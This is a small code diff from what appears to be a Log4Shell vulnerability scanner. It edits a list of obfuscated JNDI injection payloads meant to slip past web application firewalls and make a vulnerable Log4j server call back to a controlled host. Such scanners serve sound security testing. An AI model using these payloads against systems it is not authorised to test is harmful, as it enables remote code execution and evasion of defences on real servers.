@@ -54,7 +54,7 @@ post_data_parameters = ["username", "user", "uname", "name", "email", "email_add
 timeout = 4
 
 waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://0{{callback_host}}/{{random}}}",
-                       "${${::-j}ndi:rmi://1.{{callback_host}}/{{random}}}",
+                       "${${::-j}ndi:rmi://1{{callback_host}}/{{random}}}",
                        "${jndi:rmi://2{{callback_host}}/{{random}}}",
                        "${jndi:rmi://3{{callback_host}}}/",
                        "${${lower:jndi}:${lower:rmi}://4{{callback_host}}/{{random}}}",
